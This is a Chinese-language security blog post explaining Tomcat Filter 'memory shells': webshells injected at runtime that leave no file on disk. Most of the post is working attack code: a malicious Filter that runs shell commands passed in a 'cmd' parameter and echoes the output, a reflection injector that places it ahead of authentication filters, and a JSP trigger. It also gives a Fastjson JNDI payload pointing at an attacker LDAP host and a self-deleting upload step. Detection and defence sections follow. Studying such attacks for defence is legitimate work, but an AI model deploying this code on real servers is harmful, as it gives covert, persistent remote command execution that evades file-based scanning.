---
title: Tomcat Filter 内存马
date: 2025-12-27
categories: 
- 漏洞分析
tags: 
- tomcat
- filter
- 内存马
- Java安全
---

# Filter 内存马

内存马是指无文件落地、仅在内存中运行的 Webshell。与传统 JSP Webshell 不同，内存马不依赖磁盘文件，难以被常规文件扫描工具发现。Filter 型内存马利用 Tomcat 的 Filter 机制，在运行时动态注册恶意 Filter，拦截所有 HTTP 请求，是最常见的内存马类型。

**本质**：模拟 Tomcat 启动时的 Filter 动态注册——`addFilterDef` / `addFilterMap` / 反射构造 `ApplicationFilterConfig`，把恶意 `doFilter` 代码 + `/*` URL 映射组装进 `StandardContext` 的 `filterDefs` / `filterMaps` / `filterConfigs`，让 `ApplicationFilterFactory` 在下一次请求构建 Filter 链时把它当普通 Filter 调度。整体框架见 [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})。

---

## 一、Tomcat Filter 机制

### 1.1 Filter 执行流程

```
HTTP 请求
    ↓
StandardEngine → StandardHost → StandardContext
    ↓
StandardWrapperValve.invoke()
    ↓
ApplicationFilterChain.doFilter()
    ↓
Filter1 → Filter2 → ... → Servlet.service()
```

当一个 HTTP 请求到达 Tomcat 时，`ApplicationFilterChain` 负责按照 `FilterMap` 的顺序依次调用匹配的 Filter，最后到达 Servlet。

### 1.2 核心类关系

```
StandardContext
├── filterDefs: HashMap<String, FilterDef>     // Filter 定义
├── filterMaps: FilterMap[]                     // Filter-URL 映射（有序）
├── filterConfigs: HashMap<String, ApplicationFilterConfig>  // Filter 实例配置
└── pipeline (StandardPipeline)
    └── StandardContextValve → StandardWrapperValve
```

**三个关键数据结构**：

| 组件 | 作用 | 关键字段 |
|------|------|----------|
| `FilterDef` | 存储 Filter 的元信息 | `filterName`, `filterClass`, `filter`, `initParameters` |
| `FilterMap` | 定义 Filter 与 URL 的映射关系 | `filterName`, `urlPatterns`, `dispatcherTypes` |
| `ApplicationFilterConfig` | 持有 Filter 实例，管理生命周期 | `filterDef`, `filter` 实例 |

### 1.3 Filter 加载的源码分析

Tomcat 启动时通过 `ContextConfig.configureStart()` 解析 `web.xml` 和注解，调用的核心逻辑在 `StandardContext` 中：

```java
// StandardContext.filterStart() —— 初始化所有 Filter
public boolean filterStart() {
    for (FilterDef filterDef : filterDefs.values()) {
        ApplicationFilterConfig filterConfig = 
            new ApplicationFilterConfig(this, filterDef);
        filterConfigs.put(filterDef.getFilterName(), filterConfig);
    }
    return true;
}
```

```java
// ApplicationFilterChain.internalDoFilter() —— 请求过滤链
private void internalDoFilter(ServletRequest request, ServletResponse response) {
    if (pos < n) {
        ApplicationFilterConfig filterConfig = filters[pos++];
        Filter filter = filterConfig.getFilter();
        filter.doFilter(request, response, this);
        return;
    }
    // 全部 Filter 执行完毕，进入 Servlet
    servlet.service(request, response);
}
```

---

## 二、动态注册原理

**核心思路**：利用反射获取 `StandardContext` 对象，动态向其中添加 `FilterDef` 和 `FilterMap`。

### 2.1 获取 StandardContext

在 Tomcat 中，可以通过多种方式获取当前 `StandardContext` 对象：

```java
// 方式一：通过 request 获取（需要反射突破访问限制）
ServletRequest request = ...;
Field requestField = request.getClass().getDeclaredField("request");
requestField.setAccessible(true);
Request req = (Request) requestField.get(request);
StandardContext context = (StandardContext) req.getContext();
```

```java
// 方式二：通过 Thread 获取（JSP 场景）
Field contextField = Thread.currentThread().getContextClassLoader()
    .getClass().getSuperclass().getDeclaredField("resources");
// ... 逐步反射获取 StandardContext
```

```java
// 方式三：通过 MBean（JMX）
MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
ObjectName name = new ObjectName("Catalina:type=Server");
// 遍历获取 StandardContext
```

### 2.2 动态注册步骤

```
1. 编写恶意 Filter 类（实现 Filter 接口）
2. 获取 StandardContext 对象
3. 创建 FilterDef 并设置 filterName / filterClass / filter
4. 将 FilterDef 添加到 context.filterDefs
5. 创建 FilterMap 并设置 URL 映射
6. 将 FilterMap 插入到 context.filterMaps 数组首位
7. 创建 ApplicationFilterConfig 并添加到 context.filterConfigs
```

---

## 三、完整代码实现

### 3.1 恶意 Filter 类

```java
import javax.servlet.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class FilterMemShell implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                         FilterChain chain) throws IOException, ServletException {
        // 从请求中获取命令参数
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            try {
                // 统一命令执行：shell 执行 + 合并 stderr，避免管道死锁（exec 方法见下方）
                String result = exec(cmd);
                // 回显命令执行结果
                response.getWriter().write("<pre>" + result + "</pre>");
                return; // 不继续调用 chain，直接返回
            } catch (Exception e) {
                response.getWriter().write("Error: " + e.getMessage());
            }
        }
        // 正常请求放行
        chain.doFilter(request, response);
    }

    /**
     * 统一命令执行器（本系列 Filter / Servlet / Listener 三篇通用）
     * - 通过 shell 执行，支持管道、重定向等语法（/bin/sh -c 或 cmd /c）
     * - redirectErrorStream(true)：把 stderr 合并进 stdout，避免
     *   "先读 stdout 再读 stderr" 顺序读取时管道写满导致的两端互相阻塞
     * - 字节循环读取而非 Scanner，输出量大时不会阻塞
     */
    private static String exec(String cmd) throws Exception {
        String[] execCmd = System.getProperty("os.name").toLowerCase().contains("windows")
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"/bin/sh", "-c", cmd};

        Process process = new ProcessBuilder(execCmd).redirectErrorStream(true).start();
        try (ByteArrayOutputStream out = new ByteArrayOutputStream();
             InputStream is = process.getInputStream()) {
            byte[] buf = new byte[4096];
            int len;
            while ((len = is.read(buf)) != -1) {
                out.write(buf, 0, len);
            }
            process.waitFor();
            return out.toString(System.getProperty("sun.jnu.encoding"));
        }
    }

    @Override
    public void destroy() {
    }
}
```

### 3.2 注入器代码

```java
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.*;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class FilterMemShellInjector {

    /**
     * 注入 Filter 内存马
     * @param request HttpServletRequest 对象
     */
    public static void inject(ServletRequest request) throws Exception {
        // Step 1: 获取 StandardContext
        StandardContext context = getStandardContext(request);

        // Step 2: 检查是否已注入（避免重复）
        String filterName = "FilterMemShell";
        if (context.findFilterDef(filterName) != null) {
            System.out.println("[!] Filter already injected: " + filterName);
            return;
        }

        // Step 3: 创建 FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(FilterMemShell.class.getName());
        filterDef.setFilter(new FilterMemShell());

        // Step 4: 添加 FilterDef 到 context
        context.addFilterDef(filterDef);

        // Step 5: 创建 FilterMap（映射到所有 URL）
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(filterName);
        filterMap.addURLPattern("/*");
        filterMap.setDispatcher("REQUEST");

        // Step 6: 将 FilterMap 插入到首位（确保优先执行）
        // 注意：context.addFilterMap() 只会【追加到末尾】，无法保证优先级！
        // 用自定义方法 insertFilterMapFirst() 反射插入首位——兼容旧 FilterMap[] 数组
        // 与新 ContextFilterMaps 对象两种字段类型，任何 Tomcat 版本都可用
        insertFilterMapFirst(context, filterMap);

        // Step 7: 反射获取并操作 filterConfigs
        Field configsField = StandardContext.class.getDeclaredField("filterConfigs");
        configsField.setAccessible(true);
        Map<String, ApplicationFilterConfig> filterConfigs = 
            (Map<String, ApplicationFilterConfig>) configsField.get(context);

        // 手动创建 ApplicationFilterConfig（绕过生命周期检查）
        Constructor<ApplicationFilterConfig> constructor = 
            ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = 
            constructor.newInstance(context, filterDef);
        filterConfigs.put(filterName, filterConfig);
    }

    /**
     * 【自定义辅助方法，不是 Tomcat API】
     * 把 filterMap 插入到 filterMaps 首位，兼容两种字段类型：
     * - 旧版本：字段是 FilterMap[] 数组，重建数组放到 0 号位；
     * - 新版本（实测 Tomcat 8.5.39 起即如此）：字段是 ContextFilterMaps 对象，
     *   反射调 addBefore(FilterMap)。注意该类是包私有的（final class），
     *   反射调用其 public 方法也必须 setAccessible(true)，否则 IllegalAccessException。
     * findFilterMaps() 每次返回数组克隆，插入后下一次请求构建的 Filter 链就会按新顺序执行。
     */
    private static void insertFilterMapFirst(StandardContext context, FilterMap filterMap)
            throws Exception {
        Field mapsField = StandardContext.class.getDeclaredField("filterMaps");
        mapsField.setAccessible(true);
        Object filterMaps = mapsField.get(context);
        if (filterMaps instanceof FilterMap[]) {
            // 旧版本：字段是 FilterMap[] 数组
            FilterMap[] oldMaps = (FilterMap[]) filterMaps;
            FilterMap[] newMaps = new FilterMap[oldMaps.length + 1];
            newMaps[0] = filterMap;
            System.arraycopy(oldMaps, 0, newMaps, 1, oldMaps.length);
            mapsField.set(context, newMaps);
        } else {
            // 新版本：字段是 ContextFilterMaps（包私有类），反射调 addBefore
            Method addBefore = filterMaps.getClass().getMethod("addBefore", FilterMap.class);
            addBefore.setAccessible(true);
            addBefore.invoke(filterMaps, filterMap);
        }
    }

    /**
     * 从 request 中获取 StandardContext
     */
    private static StandardContext getStandardContext(ServletRequest servletRequest) 
            throws Exception {
        // 反射获取内部的 Request 对象
        Field requestField = servletRequest.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        Request request = (Request) requestField.get(servletRequest);
        return (StandardContext) request.getContext();
    }
}
```

### 3.3 触发注入的 JSP

> 说明：以下 JSP 引用默认包类 `FilterMemShellInjector`，为**讲解简化**（假设恶意类已部署）。真实利用时 JSP 必须**自包含**——把恶意类内联进 `<%! %>` 并直接注册（写法见 [Valve 篇 3.4]({% post_url 2026-08-06-Tomcat_Valve内存马 %})），或由反序列化 `defineClass` 提供类；测试工程已提供自包含版本。

```jsp
<%@ page import="java.lang.reflect.*, org.apache.catalina.core.*, 
    org.apache.tomcat.util.descriptor.web.*, javax.servlet.*" %>
<%
    try {
        FilterMemShellInjector.inject(request);
        out.println("Filter memory shell injected successfully!");
        out.println("Access: ?cmd=whoami");
    } catch (Exception e) {
        out.println("Injection failed: " + e.getMessage());
        e.printStackTrace();
    }
%>
```

---

## 四、代码详解

### 4.1 为什么要插入 FilterMap 首位？

`ApplicationFilterChain` 是按照 `filterMaps` 数组的顺序依次调用 Filter 的（每次请求都会按当前
`filterMaps` 重新构建链，因此运行时插入立即生效）。将恶意 Filter 插入到首位可以保证它在其他
Filter（如鉴权 Filter）之前执行，从而：
- 绕过认证拦截，直接执行命令（若前面的鉴权 Filter 不放行，排在末尾的 Filter 永远不会被触发）
- 即使后续 Filter 抛出异常，恶意逻辑已经执行完毕

```java
// ApplicationFilterChain 中的匹配逻辑（遍历顺序 = filterMaps 数组顺序）
for (FilterMap filterMap : filterMaps) {
    if (matchFiltersURL(filterMap, requestPath)) {
        ApplicationFilterConfig filterConfig = filterConfigs.get(filterMap.getFilterName());
        if (filterConfig != null) {
            filters.add(filterConfig);
        }
    }
}
```

**重要：`context.addFilterMap()` 只是【追加到数组末尾】，并不是插入首位！** Tomcat 源码中它的实现
是 `results[filterMaps.length] = filterMap`，新映射排在所有已有映射之后。要让恶意 Filter 真正插到
最前面，必须：
- **通用（推荐）**：反射改写 `filterMaps`（见 3.2 节自定义方法 `insertFilterMapFirst`），
  兼容旧 `FilterMap[]` 数组与新 `ContextFilterMaps` 对象两种字段类型，任何版本可用；
- **官方 API**：`context.addFilterMapBefore(filterMap)`（较新 Tomcat 提供），插入到 0 号位。

> 早期注入器代码写的是 `context.addFilterMap(filterMap)`，只能保证"能用"（目标无前置拦截时依然
> 会被执行），无法保证优先级；本节示例已改为 `insertFilterMapFirst()` 反射插入首位。

### 4.2 反射创建 ApplicationFilterConfig 的必要性

正常情况下，`ApplicationFilterConfig` 是由 Tomcat 在启动阶段通过 `StandardContext.filterStart()` 方法统一创建的。运行时直接向 `filterDefs` 添加 `FilterDef` 并不会自动创建 `ApplicationFilterConfig`，因此需要手动通过反射调用构造函数来完成实例化。

### 4.3 防止重复注入

```java
if (context.findFilterDef(filterName) != null) {
    return; // 已存在，跳过
}
```

每次请求都注入会导致内存中产生多个同名 Filter，既不规范也容易被发现。

### 4.4 版本兼容性

| Tomcat 版本 | Servlet 包 | `filterMaps` 字段类型 | 插入方式 |
|-------------|-----------|----------------------|---------|
| 8.5.x（早期） | `javax.servlet` | `FilterMap[]` 数组 | `insertFilterMapFirst` 重建数组 |
| 8.5.39+ / 9.x / 10.x / 11.x | `javax` / `jakarta` | `ContextFilterMaps` 对象 | `insertFilterMapFirst` 反射调 `addBefore` |

- `filterMaps` 字段在较新 Tomcat（**实测 Tomcat 8.5.39 起即如此**）从 `FilterMap[]` 数组重构为
  `ContextFilterMaps` 对象（含 `asArray` / `add` / `addBefore` / `remove` 方法，类本身是包私有的），
  `insertFilterMapFirst()` 已兼容两种字段类型。
- 官方 `context.addFilterMapBefore()` 在较新 Tomcat 提供；不确定版本时直接用 `insertFilterMapFirst()`
  反射兜底最稳妥。
- Tomcat 10+ 已将 Servlet 规范迁移为 `jakarta.servlet`（Servlet 5.0），本系列代码基于
  `javax.servlet`（Tomcat 8.x / 9.x）编写，移植到 10+ 需全局替换包名。
- 反射访问的私有字段（`filterConfigs`、`filterMaps` 等）在不同大版本间字段名相对稳定，但不保证
  不变；字段变更时 `getDeclaredField` 会抛 `NoSuchFieldException`，实战前应确认目标版本。
- 命令执行统一使用 `ProcessBuilder + redirectErrorStream(true)`，解决原 `Scanner` 顺序读取
  stdout/stderr 时的管道死锁问题；`addFilterMap()` 追加末尾的行为已在 4.1 节说明。

---

## 五、利用场景

### 5.1 Shiro 反序列化 → 注入内存马

Shiro rememberMe 反序列化获取代码执行能力后，注入 Filter 内存马实现持久化：

```java
// 反序列化 payload 中的代码片段
Field reqF = request.getClass().getDeclaredField("request");
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext context = (StandardContext) req.getContext();
// ... 注册 Filter
```

利用流程：
```
Shiro rememberMe Cookie → AES 解密 → 反序列化 → 代码执行
    → 反射获取 StandardContext → 注入 Filter 内存马
    → 访问 /?cmd=whoami → 命令回显
```

### 5.2 Fastjson 反序列化 → JNDI 注入

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/EvilClass",
  "autoCommit": true
}
```

`EvilClass` 的静态代码块中执行 Filter 注入逻辑。

### 5.3 文件上传 → 注入后删除

```
1. 上传 JSP 注入脚本到 web 目录
2. 访问 JSP 触发注入
3. JSP 执行完毕后自我删除（new File(application.getRealPath("/shell.jsp")).delete()）
4. 内存马持久化运行，磁盘无残留
```

### 5.4 Spring Boot Actuator 环境修改

通过 `/actuator/env` 端点修改 logging 配置，注入恶意 XML 触发代码执行后注册内存马。

---

## 六、检测方式

### 6.1 JMX 检查

```bash
# 连接本地 JMX
jconsole

# 或使用 jcmd 列出 MBean
jcmd <pid> ManagementAgent.start_local
```

通过 JMX 查看 `Catalina:type=Context` 下的 `filterDefs` 和 `filterMaps` 属性。

### 6.2 Arthas 在线查杀

```bash
# 启动 Arthas
java -jar arthas-boot.jar

# 查看所有的 Filter
vmtool --action getInstances --className org.apache.tomcat.util.descriptor.web.FilterDef --limit 50

# 查看 StandardContext 中的 filterDefs（filterDefs 是实例字段，需先拿实例）
vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express 'instances[0].filterDefs' --limit 10

# 使用 sc 搜索可疑 Filter
sc *.Filter*
```

### 6.3 JVM 内存分析

```bash
# dump 内存
jmap -dump:format=b,file=heapdump.hprof <pid>

# 使用 MAT / VisualVM 分析
# 搜索 FilterDef / ApplicationFilterConfig 对象
```

### 6.4 Java Agent 检测脚本

```java
// 通过 agent 监控 Context 的 filterDefs 变化
public class FilterMonitor implements ClassFileTransformer {
    @Override
    public byte[] transform(...) {
        // 监控 Context.addFilterDef() 和 Context.addFilterMap() 方法
        // 记录非启动阶段的调用
    }
}
```

---

## 七、防御建议

### 7.1 运行时防御

| 层面 | 措施 | 说明 |
|------|------|------|
| **JVM 层** | 部署 RASP | 监控反射调用 `addFilterDef` / `addFilterMap` |
| **容器层** | Security Manager | 限制反射访问 `StandardContext` 内部字段 |
| **系统层** | WAF | 检测请求参数中的命令注入特征 |

### 7.2 周期性巡检

```bash
# 1. 通过 JMX 导出当前 Filter 映射（需开启 JMX）
jcmd <pid> ManagementAgent.start_local
# jconsole → Catalina → Context → /your-app → Operations → findFilterMaps()

# 2. 或用 Arthas 导出 filterMaps / filterDefs 与基线比对
vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express 'instances[0].filterMaps' --limit 10
vmtool --action getInstances --className org.apache.tomcat.util.descriptor.web.FilterMap --express 'instances' --limit 50

# 3. 检查可疑 Filter 类（类名 / 类来源）
sc *.FilterMemShell*
vmtool --action getInstances --className javax.servlet.Filter --express 'instances' --limit 50

# 注：/manager/html/list 只列出已部署的 Web 应用，看不到 Filter，不能用于此对比
```

### 7.3 开发规范

```java
// 反序列化白名单
import java.io.*;

public class SafeObjectInputStream extends ObjectInputStream {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) {
        if (!isAllowed(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization");
        }
        return super.resolveClass(desc);
    }
}
```

---

## 八、总结

Filter 内存马的核心在于理解 Tomcat 的 Filter 加载机制：

1. **知道目标**：`StandardContext` 中的 `filterDefs`、`filterMaps`、`filterConfigs`
2. **获取入口**：通过反射链获取 `StandardContext` 对象
3. **动态注册**：构造并插入 `FilterDef` + `FilterMap`
4. **触发执行**：恶意 Filter 拦截所有匹配的请求，实现持续控制

Filter 内存马的隐蔽性极高，传统的文件扫描、日志审计难以发现。防御的关键在于：
- **事前**：修复反序列化等 RCE 漏洞，切断注入入口
- **事中**：部署 RASP 进行运行时行为监控
- **事后**：周期性 JVM 内存取证，对比 Filter 基线

> **延伸阅读**：[Tomcat Servlet 内存马]({% post_url 2025-12-27-Tomcat_servlet内存马 %}) | [Tomcat Listener 内存马]({% post_url 2025-12-27-Tomcat_ listener内存马 %}) | [Tomcat Valve 内存马]({% post_url 2026-08-06-Tomcat_Valve内存马 %}) | [Java Agent 内存马]({% post_url 2026-08-06-Java_Agent内存马 %}) | [Spring 容器内存马]({% post_url 2026-08-06-Spring_容器内存马 %}) | [WebSocket 等偏门内存马]({% post_url 2026-08-06-Tomcat_WebSocket等偏门内存马 %}) | [Tomcat基础]({% post_url 2025-12-30-Tomcat基础 %})
